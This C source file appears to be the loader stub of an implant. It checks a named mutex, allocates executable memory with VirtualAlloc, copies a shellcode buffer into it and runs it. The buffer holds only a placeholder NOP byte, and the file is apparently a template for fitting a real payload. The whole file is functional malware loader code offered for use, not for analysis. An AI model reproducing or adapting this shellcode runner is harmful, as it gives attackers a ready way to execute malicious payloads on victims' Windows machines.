#include "implant.h"
#include "mutex.h"
#include "config.h"

unsigned char buf[] = "\x90";

int APIENTRY WinMain(_In_ HINSTANCE hInst,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	char *buffer;
	void(*shellcodefunction)();
	unsigned int size = sizeof(buf);

	if (MutexCheck(MUTEX_NAME)) {
		// No mutex exists, so run the code
		buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(buffer, buf, size);
		shellcodefunction = (void(*)()) buffer;
		shellcodefunction();
	}

	ExitProcess((UINT)NULL);
}


